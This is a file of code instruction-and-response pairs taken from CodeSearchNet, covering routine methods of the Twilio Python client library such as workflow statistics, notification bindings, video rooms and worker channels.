{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\naccess the statistics :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsList", "response": "def statistics(self):\n        \"\"\"\n        Access the statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsList\n        \"\"\"\n        if self._statistics is None:\n            self._statistics = WorkflowStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                workflow_sid=self._solution['sid'],\n            )\n        return self._statistics"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef real_time_statistics(self):\n        if self._real_time_statistics is None:\n            self._real_time_statistics = WorkflowRealTimeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                workflow_sid=self._solution['sid'],\n            )\n        return self._real_time_statistics", "response": "Access the real_time_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_real_time_statistics.WorkflowRealTimeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_real_time_statistics.WorkflowRealTimeStatisticsList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the cumulative_statistics :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsList", "response": "def cumulative_statistics(self):\n        \"\"\"\n        Access the cumulative_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsList\n        \"\"\"\n        if self._cumulative_statistics is None:\n            self._cumulative_statistics = WorkflowCumulativeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                workflow_sid=self._solution['sid'],\n            )\n        return self._cumulative_statistics"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = WorkflowContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, friendly_name=values.unset,\n               assignment_callback_url=values.unset,\n               fallback_assignment_callback_url=values.unset,\n               configuration=values.unset, task_reservation_timeout=values.unset):\n        \"\"\"\n        Update the WorkflowInstance\n\n        :param unicode friendly_name: A string representing a human readable name for this Workflow.\n        :param unicode assignment_callback_url: A valid URL for the application that will process task assignment events.\n        :param unicode fallback_assignment_callback_url: If the request to the AssignmentCallbackUrl fails, the assignment callback will be made to this URL.\n        :param unicode configuration: JSON document configuring the rules for this Workflow.\n        :param unicode task_reservation_timeout: An integer value controlling how long in seconds TaskRouter will wait for a confirmation response from your application after assigning a Task to a worker.\n\n        :returns: Updated WorkflowInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.WorkflowInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            assignment_callback_url=assignment_callback_url,\n            fallback_assignment_callback_url=fallback_assignment_callback_url,\n            configuration=configuration,\n            task_reservation_timeout=task_reservation_timeout,\n        )", "response": "Update the WorkflowInstance s related properties"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, asset_versions=values.unset, function_versions=values.unset,\n               dependencies=values.unset):\n        \"\"\"\n        Create a new BuildInstance\n\n        :param unicode asset_versions: The asset_versions\n        :param unicode function_versions: The function_versions\n        :param unicode dependencies: The dependencies\n\n        :returns: Newly created BuildInstance\n        :rtype: twilio.rest.serverless.v1.service.build.BuildInstance\n        \"\"\"\n        data = values.of({\n            'AssetVersions': serialize.map(asset_versions, lambda e: e),\n            'FunctionVersions': serialize.map(function_versions, lambda e: e),\n            'Dependencies': dependencies,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return BuildInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new BuildInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, sid):\n        return BuildContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a BuildContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.build.BuildContext\n        :rtype: twilio.rest.serverless.v1.service.build.BuildContext"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return BuildInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of BuildInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates an instance context for the base build instance the context is capable of performing various actions.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: BuildContext for this BuildInstance\n        :rtype: twilio.rest.serverless.v1.service.build.BuildContext\n        \"\"\"\n        if self._context is None:\n            self._context = BuildContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a new BindingInstance", "response": "def create(self, identity, binding_type, address, tag=values.unset,\n               notification_protocol_version=values.unset,\n               credential_sid=values.unset, endpoint=values.unset):\n        \"\"\"\n        Create a new BindingInstance\n\n        :param unicode identity: The `identity` value that identifies the new resource's User\n        :param BindingInstance.BindingType binding_type: The type of the Binding\n        :param unicode address: The channel-specific address\n        :param unicode tag: A tag that can be used to select the Bindings to notify\n        :param unicode notification_protocol_version: The protocol version to use to send the notification\n        :param unicode credential_sid: The SID of the Credential resource to be used to send notifications to this Binding\n        :param unicode endpoint: Deprecated\n\n        :returns: Newly created BindingInstance\n        :rtype: twilio.rest.notify.v1.service.binding.BindingInstance\n        \"\"\"\n        data = values.of({\n            'Identity': identity,\n            'BindingType': binding_type,\n            'Address': address,\n            'Tag': serialize.map(tag, lambda e: e),\n            'NotificationProtocolVersion': notification_protocol_version,\n            'CredentialSid': credential_sid,\n            'Endpoint': endpoint,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return BindingInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nstreaming BindingInstance records from the API as a generator. This operation lazily loads records as efficiently as possible until the limit is reached.", "response": "def stream(self, start_date=values.unset, end_date=values.unset,\n               identity=values.unset, tag=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams BindingInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param date start_date: Only include usage that has occurred on or after this date\n        :param date end_date: Only include usage that occurred on or before this date\n        :param unicode identity: The `identity` value of the resources to read\n        :param unicode tag: Only list Bindings that have all of the specified Tags\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.notify.v1.service.binding.BindingInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            start_date=start_date,\n            end_date=end_date,\n            identity=identity,\n            tag=tag,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nstreams BindingInstance records from the API as a list.", "response": "def list(self, start_date=values.unset, end_date=values.unset,\n             identity=values.unset, tag=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists BindingInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param date start_date: Only include usage that has occurred on or after this date\n        :param date end_date: Only include usage that occurred on or before this date\n        :param unicode identity: The `identity` value of the resources to read\n        :param unicode tag: Only list Bindings that have all of the specified Tags\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.notify.v1.service.binding.BindingInstance]\n        \"\"\"\n        return list(self.stream(\n            start_date=start_date,\n            end_date=end_date,\n            identity=identity,\n            tag=tag,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving a single page of BindingInstance records from the API. This operation lazily loads records from the API until the end_date is reached.", "response": "def page(self, start_date=values.unset, end_date=values.unset,\n             identity=values.unset, tag=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of BindingInstance records from the API.\n        Request is executed immediately\n\n        :param date start_date: Only include usage that has occurred on or after this date\n        :param date end_date: Only include usage that occurred on or before this date\n        :param unicode identity: The `identity` value of the resources to read\n        :param unicode tag: Only list Bindings that have all of the specified Tags\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of BindingInstance\n        :rtype: twilio.rest.notify.v1.service.binding.BindingPage\n        \"\"\"\n        params = values.of({\n            'StartDate': serialize.iso8601_date(start_date),\n            'EndDate': serialize.iso8601_date(end_date),\n            'Identity': serialize.map(identity, lambda e: e),\n            'Tag': serialize.map(tag, lambda e: e),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return BindingPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return BindingContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a BindingContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.notify.v1.service.binding.BindingContext\n        :rtype: twilio.rest.notify.v1.service.binding.BindingContext"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return BindingInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of BindingInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = BindingContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource that is capable of performing various actions."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create(self, available_add_on_sid, accept_terms_of_service,\n               configuration=values.unset, unique_name=values.unset):\n        \"\"\"\n        Create a new InstalledAddOnInstance\n\n        :param unicode available_add_on_sid: A string that uniquely identifies the Add-on to install\n        :param bool accept_terms_of_service: A boolean reflecting your acceptance of the Terms of Service\n        :param dict configuration: The JSON object representing the configuration\n        :param unicode unique_name: The string that uniquely identifies this Add-on installation\n\n        :returns: Newly created InstalledAddOnInstance\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.InstalledAddOnInstance\n        \"\"\"\n        data = values.of({\n            'AvailableAddOnSid': available_add_on_sid,\n            'AcceptTermsOfService': accept_terms_of_service,\n            'Configuration': serialize.object(configuration),\n            'UniqueName': unique_name,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return InstalledAddOnInstance(self._version, payload, )", "response": "Create a new InstalledAddOnInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, configuration=values.unset, unique_name=values.unset):\n        data = values.of({'Configuration': serialize.object(configuration), 'UniqueName': unique_name, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return InstalledAddOnInstance(self._version, payload, sid=self._solution['sid'], )", "response": "Update the InstalledAddOnInstance\n\n        :param dict configuration: The JSON object representing the configuration\n        :param unicode unique_name: The string that uniquely identifies this Add-on installation\n\n        :returns: Updated InstalledAddOnInstance\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.InstalledAddOnInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef extensions(self):\n        if self._extensions is None:\n            self._extensions = InstalledAddOnExtensionList(\n                self._version,\n                installed_add_on_sid=self._solution['sid'],\n            )\n        return self._extensions", "response": "Access the extensions\n\n        :returns: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionList\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = InstalledAddOnContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the installed_add_on"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the InstalledAddOnInstance resource.", "response": "def update(self, configuration=values.unset, unique_name=values.unset):\n        \"\"\"\n        Update the InstalledAddOnInstance\n\n        :param dict configuration: The JSON object representing the configuration\n        :param unicode unique_name: The string that uniquely identifies this Add-on installation\n\n        :returns: Updated InstalledAddOnInstance\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.InstalledAddOnInstance\n        \"\"\"\n        return self._proxy.update(configuration=configuration, unique_name=unique_name, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the V2010 Twilio Domain", "response": "def v2010(self):\n        \"\"\"\n        :returns: Version v2010 of api\n        :rtype: twilio.rest.api.v2010.V2010\n        \"\"\"\n        if self._v2010 is None:\n            self._v2010 = V2010(self)\n        return self._v2010"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a new RoomInstance", "response": "def create(self, enable_turn=values.unset, type=values.unset,\n               unique_name=values.unset, status_callback=values.unset,\n               status_callback_method=values.unset, max_participants=values.unset,\n               record_participants_on_connect=values.unset,\n               video_codecs=values.unset, media_region=values.unset):\n        \"\"\"\n        Create a new RoomInstance\n\n        :param bool enable_turn: Use Twilio Network Traversal for TURN service.\n        :param RoomInstance.RoomType type: Type of room, either peer-to-peer, group-small or group.\n        :param unicode unique_name: Name of the Room.\n        :param unicode status_callback: A URL that Twilio sends asynchronous webhook requests to on every room event.\n        :param unicode status_callback_method: HTTP method Twilio should use when requesting the above URL.\n        :param unicode max_participants: Maximum number of Participants in the Room.\n        :param bool record_participants_on_connect: Start Participant recording when connected.\n        :param RoomInstance.VideoCodec video_codecs: An array of video codecs supported when publishing a Track in the Room.\n        :param unicode media_region: Region for the media server in Group Rooms.\n\n        :returns: Newly created RoomInstance\n        :rtype: twilio.rest.video.v1.room.RoomInstance\n        \"\"\"\n        data = values.of({\n            'EnableTurn': enable_turn,\n            'Type': type,\n            'UniqueName': unique_name,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n            'MaxParticipants': max_participants,\n            'RecordParticipantsOnConnect': record_participants_on_connect,\n            'VideoCodecs': serialize.map(video_codecs, lambda e: e),\n            'MediaRegion': media_region,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RoomInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstreaming RoomInstance records from the API as a generator.", "response": "def stream(self, status=values.unset, unique_name=values.unset,\n               date_created_after=values.unset, date_created_before=values.unset,\n               limit=None, page_size=None):\n        \"\"\"\n        Streams RoomInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param RoomInstance.RoomStatus status: Only show Rooms with the given status.\n        :param unicode unique_name: Only show Rooms with the provided Name.\n        :param datetime date_created_after: Only show Rooms that started on or after this date, given as YYYY-MM-DD.\n        :param datetime date_created_before: Only show Rooms that started before this date, given as YYYY-MM-DD.\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.video.v1.room.RoomInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            status=status,\n            unique_name=unique_name,\n            date_created_after=date_created_after,\n            date_created_before=date_created_before,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nstream the RoomInstance records from the API as a list.", "response": "def list(self, status=values.unset, unique_name=values.unset,\n             date_created_after=values.unset, date_created_before=values.unset,\n             limit=None, page_size=None):\n        \"\"\"\n        Lists RoomInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param RoomInstance.RoomStatus status: Only show Rooms with the given status.\n        :param unicode unique_name: Only show Rooms with the provided Name.\n        :param datetime date_created_after: Only show Rooms that started on or after this date, given as YYYY-MM-DD.\n        :param datetime date_created_before: Only show Rooms that started before this date, given as YYYY-MM-DD.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.video.v1.room.RoomInstance]\n        \"\"\"\n        return list(self.stream(\n            status=status,\n            unique_name=unique_name,\n            date_created_after=date_created_after,\n            date_created_before=date_created_before,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nupdating the RoomInstance :param RoomInstance.RoomStatus status: Set to completed to end the Room. :returns: Updated RoomInstance :rtype: twilio.rest.video.v1.room.RoomInstance", "response": "def update(self, status):\n        \"\"\"\n        Update the RoomInstance\n\n        :param RoomInstance.RoomStatus status: Set to completed to end the Room.\n\n        :returns: Updated RoomInstance\n        :rtype: twilio.rest.video.v1.room.RoomInstance\n        \"\"\"\n        data = values.of({'Status': status, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RoomInstance(self._version, payload, sid=self._solution['sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef recordings(self):\n        if self._recordings is None:\n            self._recordings = RoomRecordingList(self._version, room_sid=self._solution['sid'], )\n        return self._recordings", "response": "Access the recordings\n\n        :returns: twilio.rest.video.v1.room.recording.RoomRecordingList\n        :rtype: twilio.rest.video.v1.room.recording.RoomRecordingList"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef participants(self):\n        if self._participants is None:\n            self._participants = ParticipantList(self._version, room_sid=self._solution['sid'], )\n        return self._participants", "response": "Access the participants\n\n        :returns: twilio.rest.video.v1.room.room_participant.ParticipantList\n        :rtype: twilio.rest.video.v1.room.room_participant.ParticipantList"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = RoomContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the room instance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef of(d):\n    return {k: v for k, v in iteritems(d) if v != unset}", "response": "Removes unset values from a dict."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconstruct a AuthorizedConnectAppContext :param connect_app_sid: The SID of the Connect App to fetch :returns: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppContext :rtype: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppContext", "response": "def get(self, connect_app_sid):\n        \"\"\"\n        Constructs a AuthorizedConnectAppContext\n\n        :param connect_app_sid: The SID of the Connect App to fetch\n\n        :returns: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppContext\n        :rtype: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppContext\n        \"\"\"\n        return AuthorizedConnectAppContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            connect_app_sid=connect_app_sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild an instance of AuthorizedConnectAppInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AuthorizedConnectAppInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppInstance\n        :rtype: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppInstance\n        \"\"\"\n        return AuthorizedConnectAppInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AuthorizedConnectAppInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            connect_app_sid=self._solution['connect_app_sid'],\n        )", "response": "Fetch a AuthorizedConnectAppInstance\n\n        :returns: Fetched AuthorizedConnectAppInstance\n        :rtype: twilio.rest.api.v2010.account.authorized_connect_app.AuthorizedConnectAppInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = AuthorizedConnectAppContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                connect_app_sid=self._solution['connect_app_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the availabe an instance of a AuthorizedConnectAppInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef alerts(self):\n        if self._alerts is None:\n            self._alerts = AlertList(self)\n        return self._alerts", "response": "Access the Alerts Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the EventList Twilio Domain", "response": "def events(self):\n        \"\"\"\n        :rtype: twilio.rest.monitor.v1.event.EventList\n        \"\"\"\n        if self._events is None:\n            self._events = EventList(self)\n        return self._events"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a TaskActionsContext :returns: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsContext :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsContext", "response": "def get(self):\n        \"\"\"\n        Constructs a TaskActionsContext\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsContext\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsContext\n        \"\"\"\n        return TaskActionsContext(\n            self._version,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding an instance of TaskActionsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TaskActionsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsInstance\n        \"\"\"\n        return TaskActionsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfetches a TaskActionsInstance :returns: Fetched TaskActionsInstance :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a TaskActionsInstance\n\n        :returns: Fetched TaskActionsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return TaskActionsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nupdating the TaskActionsInstance :param dict actions: The JSON string that specifies the actions that instruct the Assistant on how to perform the task :returns: Updated TaskActionsInstance :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsInstance", "response": "def update(self, actions=values.unset):\n        \"\"\"\n        Update the TaskActionsInstance\n\n        :param dict actions: The JSON string that specifies the actions that instruct the Assistant on how to perform the task\n\n        :returns: Updated TaskActionsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsInstance\n        \"\"\"\n        data = values.of({'Actions': serialize.object(actions), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TaskActionsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: TaskActionsContext for this TaskActionsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsContext\n        \"\"\"\n        if self._context is None:\n            self._context = TaskActionsContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                task_sid=self._solution['task_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, actions=values.unset):\n        return self._proxy.update(actions=actions, )", "response": "Update the TaskActionsInstance\n\n        :param dict actions: The JSON string that specifies the actions that instruct the Assistant on how to perform the task\n\n        :returns: Updated TaskActionsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return WorkerChannelContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            worker_sid=self._solution['worker_sid'],\n            sid=sid,\n        )", "response": "Constructs a WorkerChannelContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of WorkerChannelInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WorkerChannelInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelInstance\n        \"\"\"\n        return WorkerChannelInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            worker_sid=self._solution['worker_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, capacity=values.unset, available=values.unset):\n        data = values.of({'Capacity': capacity, 'Available': available, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WorkerChannelInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            worker_sid=self._solution['worker_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the WorkerChannelInstance\n\n        :param unicode capacity: The total number of Tasks worker should handle for this TaskChannel type.\n        :param bool available: Toggle the availability of the WorkerChannel.\n\n        :returns: Updated WorkerChannelInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkerChannelContext for this WorkerChannelInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.worker_channel.WorkerChannelContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkerChannelContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                worker_sid=self._solution['worker_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
